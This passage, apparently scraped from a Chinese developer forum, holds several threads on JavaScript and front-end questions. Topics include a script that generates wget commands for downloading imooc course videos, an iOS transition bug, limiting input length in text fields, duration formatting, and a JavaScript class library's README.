class=\"nx\">url</span><span class=\"o\">:</span> <span class=\"nx\">result</span><span class=\"p\">.</span><span class=\"nx\">mpath</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"p\">};</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">cmd</span> <span class=\"o\">=</span> <span class=\"s1\">'wget -O \"'</span> <span class=\"o\">+</span> <span class=\"nx\">dic</span><span class=\"p\">[</span><span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"p\">]</span> <span class=\"o\">+</span> <span class=\"s2\">\" - \"</span> <span class=\"o\">+</span> <span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">name</span> <span class=\"o\">+</span> <span class=\"s1\">'.mp4\" '</span> <span class=\"o\">+</span> <span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">url</span><span class=\"p\">;</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">cmd</span><span class=\"p\">);</span>\n        <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">cmd</span> <span class=\"o\">+=</span> <span class=\"nx\">cmd</span><span class=\"p\">;</span>\n        <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">cmd</span> <span class=\"o\">+=</span> <span class=\"s1\">'\\r\\n'</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n\n    <span class=\"kd\">var</span> <span class=\"nx\">index</span> <span class=\"o\">=</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n    <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'.J-media-item'</span><span class=\"p\">).</span><span class=\"nx\">each</span><span class=\"p\">(</span><span class=\"kd\">function</span> <span class=\"p\">()</span> <span class=\"p\">{</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">url</span> <span class=\"o\">=</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">).</span><span class=\"nx\">attr</span><span class=\"p\">(</span><span class=\"s1\">'href'</span><span class=\"p\">);</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">data</span> <span class=\"o\">=</span> <span class=\"nx\">url</span><span class=\"p\">.</span><span class=\"nx\">split</span><span class=\"p\">(</span><span class=\"s1\">'/'</span><span class=\"p\">);</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">type</span> <span class=\"o\">=</span> <span class=\"nx\">data</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">];</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">id</span> <span class=\"o\">=</span> <span class=\"nx\">data</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">];</span>\n        <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nx\">type</span> <span class=\"o\">!=</span> <span class=\"s1\">'video'</span><span class=\"p\">){</span>\n            <span class=\"k\">return</span><span class=\"p\">;</span>\n        <span class=\"p\">}</span>\n\n        <span class=\"kd\">var</span> <span class=\"nx\">jsonPath</span> <span class=\"o\">=</span> <span class=\"s2\">\"http://www.imooc.com/course/ajaxmediainfo/?mid=\"</span> <span class=\"o\">+</span> <span class=\"nx\">id</span> <span class=\"o\">+</span> <span class=\"s2\">\"&amp;mode=flash\"</span><span class=\"p\">;</span>\n        <span class=\"nx\">dic</span><span class=\"p\">[</span><span class=\"nx\">id</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nx\">index</span><span class=\"p\">;</span>\n        <span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">getJSON</span><span class=\"p\">(</span><span class=\"nx\">jsonPath</span><span class=\"p\">,</span> <span class=\"nx\">getJsonCallback</span><span class=\"p\">);</span>\n        <span class=\"nx\">index</span><span class=\"o\">++</span><span class=\"p\">;</span>\n    <span class=\"p\">});</span>\n<span class=\"p\">})();</span>\n</pre></div>\n</div></div>"], "reply": "46", "tittle": "写了一个慕课网视频批量下载脚本生成脚本", "comment": ["这个必须赞，电脑上就是不能下载，麻烦", "都已经免费了  就不要这样子搞么 投资人看到不好啊。", " 还是需要搞一下，方便离线看。", "慕课网靠什么赚钱?\r", "\r", "网易云课堂是含金钥匙出生的\r", "极客学院有 VIP 机制，\r", "慕课网全免费，靠什么盈利？", " 教育部开过一个互联网+下一代教育大会", " \r", "有啊、可以帮助推广开发组件啊。比如阿里云、测试平台什么的。", "正好下载了在跑步机上看", "赞一个", "顶一个", "Like.", " 导出的顺序是乱序的 求改成按顺序从 1 开始的", " 下载的顺序是乱的，但是下载完后，观看是就是对得了。", "前端不熟悉，博览网 ", " 有办法搞定吗？", " 最近正在学 JS 很奇怪这例子。获取到的是按顺序的，怎么打印输出顺序就不对了了，望赐教。\r", "\r", "\r", "还有，有什么方法，例如迅雷或者百度云等云空间，批量导入的同时支持自定义文件名的呢", " wget -O 的值是中文会乱码 求解决方法", "好吧！ IDM 足矣", " 我这里并没有乱码，你可以说下你的具体什么情况", "太实用了,大赞!", "做成浏览器插件会不会好一点", " 是会好一点，但是没做过……你可以试下，我毕竟不是专业搞前端的。", "好像没有效果啊", "用错地方了，还真好用", "真心好用。 thanks very much!", "大赞！要是能自动改名就更好了\r", " \r", "是自动更名啊。", "win 下把脚本放入一个 txt 文件然后  \r", "\r", "```\r", " off\r", "for /f \"tokens=*\" %%i in (download.txt) do (start cmd /c %%i & ping -n 2 127.1>nul)\r", "pause\r", "```\r", "\r", "保存成 bat\r", "就会批量下载了,wget 的多任务貌似不能同时", "移动端都有离线功能 可以下载下来的", " wget 单进程单线程，同时下载就多开几个 screen 。\r", "没试过能不能 axel 多线程，如果能的话其实一个一个下问题也不大。", " axel -n 10 单任务已经把带宽跑满了，，不打算纠结多任务了。\r", "第 7 行改为： var cmd = 'axel -n 10 -o \"' + dic[data.id] + \" - \" + data.name + '.mp4\" ' + data.url;\r", "-n 后面的值根据总带宽除以 wget 稳定后的速度再稍微富裕几个线程", " 有的搞，谢谢。", "嗯.谢谢!", "  嗯,谢谢", "很实用，感谢。", "用 Node.js 写了个 imooc 小爬虫\r", " 666666", "Screenshot:\r", " ", "   ", " ", "有个小 bug ，有的章节可能是练习题，但是还是把它解析成 MP4 了", " 能给个链接吗？", "谢谢，先拿去了", "mark", " 嗯，找了个这种情况特别多的：\r", "\r", " 搞定了，谢谢。", "报告一下：使用 @", " 的 coffee 脚本在下载 337 课程的时候抱错，貌似是解析的问题", " 感谢反馈。已对文件名进行特殊符号替换为下划线处理 ;-)", "太实用了,大赞!o.", "正好有要下载的教程 嘿嘿"]},
{"content": ["<div class=\"topic_content\">ios 的情况下，当你在页面内长按一张图片直到出现保存图片的提示后，点取消或者再点击一下屏幕，这之后的所有 transition 过渡效果全部错乱！！！\r<br>例如 2s 的过渡时间，到了 1s 之后的过渡效果是直接变没有了。这尼玛简直是轻应用的杀手级 BUG 。\r<br>解决方法:\r<br>1.全部图片改成 用背景图来显示。\r<br>2.用 canvas 的框架来做。</div>"], "reply": "目前尚无回", "tittle": "微信上有个长久的严重 BUG 到现在还没修复 真是醉了", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想实现一个限制用户输入 20 个字后就不能再输入的功能，现在遇到的问题是，在快到字数限制的时候（比如已经输入了 18 个字），我想要再输入字的时候，由于一般用的是拼音输入法，输入的拼音也会计入输入字数的，导致没办法继续输入。请问有什么好的解决方案吗？</p>\n</div></div>", "<div class=\"topic_content\">我这边要实现数字、字母、符号只占一个字数，汉字占 2 个字数，所以原生的 maxlength 应该用不了</div>"], "reply": "18", "tittle": "问一个网页文本框限制输入字数的问题", "comment": ["达到字数限制时，设置一个定时器，如果***ms 后，字符长度依旧超出限制，进行截断并提示。", " 这种体验恐怕不好吧，用户打的字突然就没了。\r", "有没有办法判断用户到底是在打英文，还是在中文输入法里打拼音", "捕捉 keypress 事件，然后通过 preventDefault()阻止输入\r", "\r", "我这是禁止输入除数字以外的字符，测试了一下，拼音可以打上，但选字后无法输入", " 测试了下不好使，输入法输入的居然阻止不了。。。我也不知道为什么。。。", "maxlength 原生。", " \r", " \r", "用原生的 maxlength 貌似不符合我的需求，我这边想做是数字、字母和符号占一个字数，汉字占 2 个字数。\r", "而且原生的 maxlength 貌似还有兼容性问题？", "汉字占两个是哪里的规矩 好奇怪", " 汉字也只占一个长度，前端都是 UTF8 编码的，怎么会两个呢", " 我知道 UTF-8 里面汉字也只占一个长度，但我要实现在计算字数的时候，一个汉字当两个长度算", "输入法会阻断原生事件判定，中文环境的坑。兼容性最好的办法一楼已经给你了，不要直接删掉，给红圈提示让用户自己删。", "这个看看 twitter 、 sina 微博的体验就可以了。不要打断用户，让他输，给个提示不让提交就可以了。", "UTF-8 不会出现这样的情况（占用字符长度不一致）。你需要检查一下你的代码了，看看网页的编码是不是真的是 UTF-8 。\r", "\r", "另外就这个问题来说，其实最佳的方法是不要去阻止用户的输入（就是说不要用`preventDefault`），只给出提示，并且让用户不能提交表单。当用户发现提示的时候，会自己删除多余字符的。\r", "\r", "一旦你使用了`preventDefault`，就意味着会丢弃用户输入的部分内容，对用户来说这是绝对不可接受的。（不改变用户输入的原则）", " 是我想加一个功能，让汉字变成占 2 个长度", "OK ，谢谢各位的答疑，看来阻止提交还是最佳的方案", "监听 compositionend 事件", " 你这样需要后端去判断，后端对于编码的解析比较好", " \r", "\r", "哦，不好意思，回帖的时候没有看到更新的回复。\r", "\r", "如果一定要这样做的话，可以自行维护一张字码表，将“数字、字母、符号”放在里面单独计为 1 个，其他字符都计为 2 个，并且不要使用“阻止用户输入更多字符”的方式，转而“提示用户删除更多字符”。这样用户体验上是可行的。\r", "\r", "不好的地方是，你不能直接得到字符串的长度，每次都需要扫描整个字符串来得到准确的长度。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>像这样写有没有什么问题?</p>\n<div class=\"highlight\"><pre><span class=\"kd\">function</span> <span class=\"nx\">getDuration</span><span class=\"p\">(</span><span class=\"nx\">lasttime</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">seconds</span> <span class=\"o\">=</span> <span class=\"p\">(</span> <span class=\"nb\">Date</span><span class=\"p\">.</span><span class=\"nx\">now</span><span class=\"p\">()</span> <span class=\"o\">/</span> <span class=\"mi\">1000</span> <span class=\"o\">|</span> <span class=\"mi\">0</span> <span class=\"p\">)</span> <span class=\"o\">-</span> <span class=\"nx\">lasttime</span><span class=\"p\">;</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">seconds</span> <span class=\"o\">&gt;</span> <span class=\"mi\">60</span><span class=\"o\">*</span><span class=\"mi\">2</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">seconds</span> <span class=\"o\">&gt;</span> <span class=\"mi\">3600</span><span class=\"o\">*</span><span class=\"mi\">2</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">seconds</span> <span class=\"o\">&gt;</span> <span class=\"mi\">3600</span><span class=\"o\">*</span><span class=\"mi\">24</span><span class=\"o\">*</span><span class=\"mi\">2</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n                <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">seconds</span> <span class=\"o\">&gt;</span> <span class=\"mi\">3600</span><span class=\"o\">*</span><span class=\"mi\">24</span><span class=\"o\">*</span><span class=\"mi\">7</span><span class=\"o\">*</span><span class=\"mi\">2</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n                    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">seconds</span> <span class=\"o\">&gt;</span> <span class=\"mi\">3600</span><span class=\"o\">*</span><span class=\"mi\">24</span><span class=\"o\">*</span><span class=\"mi\">30</span><span class=\"o\">*</span><span class=\"mi\">2</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n                        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">seconds</span> <span class=\"o\">&gt;</span> <span class=\"mi\">3600</span><span class=\"o\">*</span><span class=\"mi\">24</span><span class=\"o\">*</span><span class=\"mi\">365</span><span class=\"o\">*</span><span class=\"mi\">2</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n                            <span class=\"k\">return</span> <span class=\"p\">(</span><span class=\"nx\">seconds</span> <span class=\"o\">/</span> <span class=\"p\">(</span><span class=\"mi\">3600</span><span class=\"o\">*</span><span class=\"mi\">24</span><span class=\"o\">*</span><span class=\"mi\">365</span><span class=\"p\">)</span> <span class=\"o\">|</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s2\">\" years\"</span><span class=\"p\">;</span>\n                        <span class=\"p\">}</span>\n                        <span class=\"k\">return</span> <span class=\"p\">(</span><span class=\"nx\">seconds</span> <span class=\"o\">/</span> <span class=\"p\">(</span><span class=\"mi\">3600</span><span class=\"o\">*</span><span class=\"mi\">24</span><span class=\"o\">*</span><span class=\"mi\">30</span><span class=\"p\">)</span> <span class=\"o\">|</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s2\">\" months\"</span><span class=\"p\">;</span>\n                    <span class=\"p\">}</span>\n                    <span class=\"k\">return</span> <span class=\"p\">(</span><span class=\"nx\">seconds</span> <span class=\"o\">/</span> <span class=\"p\">(</span><span class=\"mi\">3600</span><span class=\"o\">*</span><span class=\"mi\">24</span><span class=\"o\">*</span><span class=\"mi\">7</span><span class=\"p\">)</span> <span class=\"o\">|</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s2\">\" weeks\"</span><span class=\"p\">;</span>\n                <span class=\"p\">}</span>\n                <span class=\"k\">return</span> <span class=\"p\">(</span><span class=\"nx\">seconds</span> <span class=\"o\">/</span> <span class=\"p\">(</span><span class=\"mi\">3600</span><span class=\"o\">*</span><span class=\"mi\">24</span><span class=\"p\">)</span> <span class=\"o\">|</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s2\">\" days\"</span><span class=\"p\">;</span>\n            <span class=\"p\">}</span>\n            <span class=\"k\">return</span> <span class=\"p\">(</span><span class=\"nx\">seconds</span> <span class=\"o\">/</span> <span class=\"mi\">3600</span> <span class=\"o\">|</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s2\">\" hours\"</span><span class=\"p\">;</span>\n        <span class=\"p\">}</span>\n        <span class=\"k\">return</span> <span class=\"p\">(</span><span class=\"nx\">seconds</span> <span class=\"o\">/</span> <span class=\"mi\">60</span> <span class=\"o\">|</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s2\">\" minutes\"</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">return</span> <span class=\"p\">(</span><span class=\"nx\">seconds</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s2\">\" seconds\"</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</pre></div>\n</div></div>"], "reply": "2", "tittle": "如何把时间长度(秒)转换成可读的形式", "comment": ["那为什么不反过来？\r", "这么多层嵌套真是药丸，多一行少一行看不出来\r", "if time>year\r", "return ...\r", "if time>month\r", "return ...\r", "\r", "|0 是什么意思？\r", "\r", "另外时间的显示 python 标准库里似乎是有现成的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>第一段代码显式的设置了 doc[j].hasAttribute(temp)===true ，循环体会执行<br>\n而第二段没有，循环体不会执行</p>\n\n<p>doc[j].hasAttribute(temp)的执行结果本来就是 true 和 false</p>\n\n<p>那么第二段代码的循环体为什么不会执行呢？</p>\n<div class=\"highlight\"><pre>var doc = document.getElementsByTagName('*');\n            for (var j = 0; j &lt; doc.length; j++) {\n                if (doc[j].hasAttribute(temp)===true) {\n                    element = doc[j]; //会执行\n</pre></div>\n<div class=\"highlight\"><pre>var doc = document.getElementsByTagName('*');\n            for (var j = 0; j &lt; doc.length; j++) {\n                if (doc[j].hasAttribute(temp)) {\n                    element = doc[j]; //不会执行\n</pre></div>\n</div></div>"], "reply": "10", "tittle": "遇到一个 JavaScript 的问题", "comment": ["我不明白大括号在哪结尾的", "我觉得上面那个如果执行了，下面那个也应该执行的\r", "试一下在 for 循环里 log 下 doc[j].hasAttribute(temp)的结果比较下吧  typeof 也 log 下", "temp 是个变量，看一下你第二段代码有没有给 temp 赋值呢", "如果两段代码没问题的话，请检查你的 temp 变量是否一致。", " \r", " \r", " \r", " \r", "\r", "完整代码附上\r", "\r", "function $(selector) {\r", "    var str = selector.split(' '),\r", "        temp,\r", "        element;\r", "    for (var i = 0; i < str.length; i++) {\r", "        if (str[i].indexOf('#') === 0) {\r", "            temp = str[i].replace('#', '');\r", "            element = document.getElementById(str2);\r", "        } else if (str[i].indexOf('.') === 0) {\r", "            temp = str[i].replace('.', '');\r", "            console.log(str2);\r", "            element = document.getElementsByClassName(str2)[0];\r", "        } else if (str[i].indexOf('[') === 0 && str[i].indexOf('=') === -1) {\r", "            temp = str[i].replace('[', '').replace(']', '');\r", "            console.log(temp)\r", "            var doc = document.getElementsByTagName('*');\r", "            console.log(temp)\r", "            for (var j = 0; j < doc.length; j++) {\r", "                console.log(temp)\r", "                if (doc[j].hasAttribute(temp)===true) {\r", "                    console.log(temp)\r", "                    element = doc[j];\r", "                    //alert('true')\r", "                }\r", "            }\r", "\r", "        }\r", "    }\r", "    return element;\r", "}", " 你的 str2 呢?", "  str2 忘记改成 temp", " 我在 chrome 下测试了你贴的代码，并没有出现你所说的问题", " ", " ", " 用$(\"[class]\")应该可以重现我的问题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>猜猜下面的代码你们猜会是什么效果？</h1>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">A</span> <span class=\"o\">=</span> <span class=\"nx\">Class</span><span class=\"p\">(</span><span class=\"s1\">'A'</span><span class=\"p\">,</span> <span class=\"nb\">Object</span><span class=\"p\">)</span>\n  <span class=\"p\">.</span><span class=\"nx\">method</span><span class=\"p\">(</span><span class=\"s1\">'constructor'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n    <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">name</span> <span class=\"o\">=</span> <span class=\"s1\">'a'</span><span class=\"p\">;</span>\n  <span class=\"p\">});</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">B</span> <span class=\"o\">=</span> <span class=\"nx\">Class</span><span class=\"p\">(</span><span class=\"s1\">'B'</span><span class=\"p\">,</span> <span class=\"nx\">A</span><span class=\"p\">);</span>\n<span class=\"nx\">B</span><span class=\"p\">.</span><span class=\"nx\">method</span><span class=\"p\">(</span><span class=\"s1\">'run'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'run'</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">C</span> <span class=\"o\">=</span> <span class=\"nx\">B</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">(</span><span class=\"s1\">'C'</span><span class=\"p\">)</span>\n  <span class=\"p\">.</span><span class=\"nx\">method</span><span class=\"p\">(</span><span class=\"s1\">'run'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'run a: '</span><span class=\"p\">,</span> <span class=\"nx\">a</span><span class=\"p\">);</span>\n  <span class=\"p\">})</span>\n  <span class=\"p\">.</span><span class=\"nx\">method</span><span class=\"p\">(</span><span class=\"s1\">'run'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">,</span><span class=\"nx\">b</span><span class=\"p\">){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'run a, b: '</span><span class=\"p\">,</span> <span class=\"nx\">a</span><span class=\"p\">,</span> <span class=\"nx\">b</span><span class=\"p\">);</span>\n  <span class=\"p\">});</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">c</span> <span class=\"o\">=</span> <span class=\"nx\">C</span><span class=\"p\">();</span>\n<span class=\"nx\">c</span><span class=\"p\">.</span><span class=\"nx\">run</span><span class=\"p\">();</span>\n<span class=\"nx\">c</span><span class=\"p\">.</span><span class=\"nx\">run</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n<span class=\"nx\">c</span><span class=\"p\">.</span><span class=\"nx\">run</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">);</span>\n</pre></div>\n\n<h1>BlxClass</h1>\n\n<h2>GitHub</h2>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/bramblex/BlxClass\">https://github.com/bramblex/BlxClass</a></p>\n\n<h2>简介</h2>\n\n<p>一个 JavaScript 面对对象的库，让你在 JavaScript 用上靠谱的面对对象特性。</p>\n\n<h2>使用</h2>\n\n<p>将本项目中的 <code>dist/Class.js</code> 复制到你的项目下</p>\n\n<h3>1. 在 nodejs 中使用</h3>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">Class</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">'path/to/Class.js'</span><span class=\"p\">);</span>\n<span class=\"kd\">var</span> <span class=\"nx\">ClassA</span> <span class=\"o\">=</span> <span class=\"nx\">Class</span><span class=\"p\">(</span><span class=\"s1\">'ClassA'</span><span class=\"p\">,</span> <span class=\"nb\">Object</span><span class=\"p\">);</span>\n</pre></div>\n\n<h3>2. 在浏览器中使用</h3>\n<div class=\"highlight\"><pre><span class=\"nt\">&lt;script </span><span class=\"na\">src=</span><span class=\"s\">\"path/to/Class.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">ClassA</span> <span class=\"o\">=</span> <span class=\"nx\">Class</span><span class=\"p\">(</span><span class=\"s1\">'ClassA'</span><span class=\"p\">,</span> <span class=\"nb\">Object</span><span class=\"p\">);</span>\n<span class=\"nt\">&lt;/script&gt;</span>\n</pre></div>\n\n<h2>API</h2>\n\n<h3>1.  Class( class_name, parent_class)</h3>\n\n<p>Class 函数接受两个参数返回一个新类，第一个参数是新类的命名，第二个参数是继承自哪个类。如果并没有继承自别的类，那么直接写 Object 就好了。</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">ClassA</span> <span class=\"o\">=</span> <span class=\"nx\">Class</span><span class=\"p\">(</span><span class=\"s1\">'ClassA'</span><span class=\"p\">,</span> <span class=\"nb\">Object</span><span class=\"p\">);</span>\n<span class=\"kd\">var</span> <span class=\"nx\">ClassB</span> <span class=\"o\">=</span> <span class=\"nx\">Class</span><span class=\"p\">(</span><span class=\"s1\">'ClassB'</span><span class=\"p\">,</span> <span class=\"nx\">ClassA</span><span class=\"p\">);</span>\n</pre></div>\n\n<h3>2. name</h3>\n\n<p>类的名字</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">ClassA</span> <span class=\"o\">=</span> <span class=\"nx\">Class</span><span class=\"p\">(</span><span class=\"s1\">'ClassA'</span><span class=\"p\">,</span> <span class=\"nb\">Object</span><span class=\"p\">);</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">ClassA</span><span class=\"p\">.</span><span class=\"nx\">name</span><span class=\"p\">)</span> <span class=\"c1\">// =&gt; ClassA</span>\n<span class=\"kd\">var</span> <span class=\"nx\">ClassB</span> <span class=\"o\">=</span> <span class=\"nx\">Class</span><span class=\"p\">(</span><span class=\"s1\">'some name'</span><span class=\"p\">,</span> <span class=\"nx\">ClassA</span><span class=\"p\">);</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">ClassB</span><span class=\"p\">.</span><span class=\"nx\">name</span><span class=\"p\">)</span> <span class=\"c1\">// =&gt; some name</span>\n</pre></div>\n\n<h3>3. parent</h3>\n\n<p>类的父类</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">ClassA</span> <span class=\"o\">=</span> <span class=\"nx\">Class</span><span class=\"p\">(</span><span class=\"s1\">'ClassA'</span><span class=\"p\">,</span> <span class=\"nb\">Object</span><span class=\"p\">);</span>\n<span class=\"nx\">ClassA</span><span class=\"p\">.</span><span class=\"nx\">parent</span> <span class=\"o\">===</span> <span class=\"nb\">Object</span><span class=\"p\">;</span> <span class=\"c1\">// =&gt; true</span>\n<span class=\"kd\">var</span> <span class=\"nx\">ClassB</span> <span class=\"o\">=</span> <span class=\"nx\">Class</span><span class=\"p\">(</span><span class=\"s1\">'ClassB'</span><span class=\"p\">,</span> <span class=\"nx\">ClassA</span><span class=\"p\">);</span>\n<span class=\"nx\">ClassB</span><span class=\"p\">.</span><span class=\"nx\">parent</span> <span class=\"o\">===</span> <span class=\"nx\">ClassA</span><span class=\"p\">;</span> <span class=\"c1\">// =&gt; true</span>\n</pre></div>\n\n<h3>4. method( method_name, function )</h3>\n\n<p>定义方法，方法会被子类继承，并且能够重载。</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">ClassA</span> <span class=\"o\">=</span> <span class=\"nx\">Class</span><span class=\"p\">(</span><span class=\"s1\">'ClassA'</span><span class=\"p\">,</span> <span class=\"nb\">Object</span><span class=\"p\">)</span>\n    <span class=\"p\">.</span><span class=\"nx\">method</span><span class=\"p\">(</span><span class=\"s1\">'constructor'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n        <span class=\"c1\">// 构造函数</span>\n        <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">name</span> <span class=\"o\">=</span> <span class=\"s1\">'no name'</span><span class=\"p\">;</span>\n    <span class=\"p\">})</span>\n    <span class=\"p\">.</span><span class=\"nx\">method</span><span class=\"p\">(</span><span class=\"s1\">'constructor'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">name</span><span class=\"p\">){</span>\n        <span class=\"c1\">// 重载构造函数</span>\n        <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">name</span> <span class=\"o\">=</span> <span class=\"nx\">name</span><span class=\"p\">;</span>\n    <span class=\"p\">})</span>\n    <span class=\"p\">.</span><span class=\"nx\">method</span><span class=\"p\">(</span><span class=\"s1\">'run'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n        <span class=\"c1\">// 普通方法</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'run'</span><span class=\"p\">);</span>\n    <span class=\"p\">})</span>\n    <span class=\"p\">.</span><span class=\"nx\">method</span><span class=\"p\">(</span><span class=\"s1\">'run'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">,</span><span class=\"nx\">b</span><span class=\"p\">){</span>\n        <span class=\"c1\">// 重载上面定义的 run 方法</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'run a, b: '</span><span class=\"p\">,</span> <span class=\"nx\">a</span><span class=\"p\">,</span> <span class=\"nx\">b</span><span class=\"p\">);</span>\n    <span class=\"p\">})</span>\n    <span class=\"p\">.</span><span class=\"nx\">method</span><span class=\"p\">(</span><span class=\"s1\">'run'</span><span class=\"p\">,</span> <span class=\"s1\">'*'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n        <span class=\"c1\">// 其他任意参数的情况</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">arguments</span><span class=\"p\">);</span>\n    <span class=\"p\">});</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">a</span> <span class=\"o\">=</span> <span class=\"nx\">ClassA</span><span class=\"p\">();</span>\n<span class=\"kd\">var</span> <span class=\"nx\">b</span> <span class=\"o\">=</span> <span class=\"nx\">ClassA</span><span class=\"p\">(</span><span class=\"s1\">'Li Lei'</span><span class=\"p\">);</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">name</span><span class=\"p\">);</span> <span class=\"c1\">// =&gt; no name</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">b</span><span class=\"p\">.</span><span class=\"nx\">name</span><span class=\"p\">);</span> <span class=\"c1\">// =&gt; Li Lei</span>\n<span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">run</span><span class=\"p\">();</span> <span class=\"c1\">// =&gt; run</span>\n<span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">run</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span><span 